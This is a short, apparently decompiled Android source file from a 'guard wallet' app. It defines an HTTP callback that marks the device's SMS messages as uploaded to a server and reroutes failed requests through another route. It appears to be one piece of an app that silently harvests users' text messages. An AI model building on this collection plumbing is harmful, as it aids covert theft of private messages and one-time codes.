package com.guard.wallet.http;
import com.guard.wallet.core.AppUtils;

import android.util.Log;
import com.guard.wallet.resp.ApiResult;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import okhttp3.ResponseBody;

/**
 * 同步短信回调 — vendor http/a0.
 *
 * <p>短信同步完成后标记 syncSmsMessage 为已完成。
 */
public final class SyncSmsCallback implements Callback {
    @Override
    public void onFailure(Call call, IOException e) {
        AppUtils.s("SyncSmsCallback", e);
        if (!(e instanceof DuplicateRequestException)) { HttpClient.finishRequest(call.request().url().host()); HttpApiManager.routeForwarding(call, this); }
    }
    @Override
    public void onResponse(Call call, Response response) throws IOException {
        HttpClient.finishRequest(call.request().url().host());
        ResponseBody var6 = response.body();
        if (var6 != null) {
            try {
                SyncSmsCallback$1 var3 = new SyncSmsCallback$1();
                ApiResult var7 = (ApiResult) com.guard.wallet.utils.SharedPrefsManager.c(var6.string(), var3);
                if (var7 != null && var7.getSuccess() && (Boolean) var7.getData()) {
                    Log.d("SyncSmsCallback", "设备短信已同步完成");
                    com.guard.wallet.utils.SharedPrefsManager.D(Boolean.TRUE, "syncSmsMessage");
                }
            } catch (Exception var8) { AppUtils.s("SyncSmsCallback", var8); }
        }
        response.close();
    }
}
